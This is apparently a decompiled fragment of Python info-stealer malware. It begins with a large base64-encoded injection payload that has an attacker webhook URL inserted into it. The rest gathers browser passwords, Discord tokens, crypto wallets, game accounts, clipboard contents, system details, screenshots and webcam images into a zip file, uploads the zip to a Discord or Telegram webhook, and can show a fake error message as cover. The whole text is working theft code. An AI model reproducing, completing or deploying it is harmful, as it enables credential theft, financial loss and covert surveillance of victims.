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')).decode()
        injection_code = injection_code.replace('%WEBHOOK%', options['webhook_options']['webhook_url'])
        Injection(injection_code)
    zipF = zipfile.ZipFile(os.path.join(temp, fn), 'w', zipfile.ZIP_DEFLATED)
    zipF.setpassword(b'1')
    if modules['take_screenshot']['enabled']:
        get_screenshot(zipF)
    if modules['steal_chrome']['enabled']:
        process_stolen_passwords(CHStealer.steal_browser_info(), zipF)
    if modules['steal_firefox']['enabled']:
        zipF.writestr('firefox_results.json', json.dumps(FFStealer.steal_browser_info(), indent=4))
    if modules['steal_discord_tokens']['enabled']:
        zipF.writestr('discord_tokens.txt', ', '.join(set(DiscordTokens.search_tks())))
    if modules['steal_crypto_wallets']['enabled']:
        WalletStealer.steal_wallets(zipF)
    if modules['steal_common_files']['enabled']:
        StealCommonFiles().steal_common_files(zipF)
    if modules['steal_minecraft_accounts']['enabled']:
        StealGameAccounts().steal_minecraft_accounts(zipF)
    if modules['steal_epicgames_accounts']['enabled']:
        StealGameAccounts().steal_epic_accounts(zipF)
    if modules['steal_steam_accounts']['enabled']:
        StealSteam()
    if modules['steal_clipboard']['enabled']:
        c = pyperclip.paste()
        if c:
            zipF.writestr('clipboard.txt', c if c else 'No clipboard data')
    if modules['collect_system_info']['enabled']:
        zipF.writestr('system_info.txt', get_system_info())
    if modules['take_webcam_picture']['enabled']:
        capture_images(zipF)
    zipF.close()
    if options['webhook_type']['type'].lower()!= 'telegram':
        upload_to_discord()
    else:  # inserted
        if options['webhook_type']['type'].lower() == 'telegram':
            upload_to_telegram()
    if options['fake_error']['enabled']:
        MessageBox(0, options['fake_error']['title'], options['fake_error']['text'], 16)